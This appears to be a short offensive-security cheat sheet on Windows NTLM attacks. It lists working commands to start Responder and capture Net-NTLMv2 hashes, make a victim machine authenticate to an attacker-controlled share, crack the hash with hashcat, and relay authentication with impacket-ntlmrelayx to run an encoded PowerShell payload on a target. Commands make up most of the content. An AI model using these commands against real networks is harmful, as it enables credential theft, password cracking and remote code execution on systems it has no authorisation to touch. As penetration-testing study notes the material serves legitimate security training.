# Net-NTLMv2, Responder & NTLM Relay

## Net-NTLMv2

**Net-NTLMv2** is not stored — it is generated on the fly as a challenge-response. It **cannot** be used for PtH but can be captured and cracked, or relayed.

```bash
# Start Responder on Kali
sudo responder -I tun0

# From victim machine — trigger auth to a non-existent share
dir \\<our-ip>\random-share

# Crack the captured hash
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --force
```

---

## NTLM Relay

Intercept an in-progress authentication and forward it to another target to authenticate as the victim.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.140.212 -c "powershell -e <BASE64_PAYLOAD>"
```
